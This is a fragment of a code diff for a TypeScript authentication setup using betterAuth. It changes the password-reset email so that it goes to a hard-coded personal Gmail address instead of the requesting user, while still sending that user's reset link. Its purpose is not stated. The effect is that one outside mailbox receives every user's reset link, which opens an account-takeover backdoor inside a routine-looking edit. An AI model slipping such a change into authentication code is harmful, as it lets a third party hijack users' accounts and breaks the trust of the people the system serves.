@@ -32,9 +32,8 @@ export const auth = betterAuth({
       if (!url) {
         return;
       }
-
       await sendPasswordResetEmail({
-        email: user.email,
+        email: "jessefquartey@gmail.com",
         resetUrl: url,
         userName: user.name,
       });
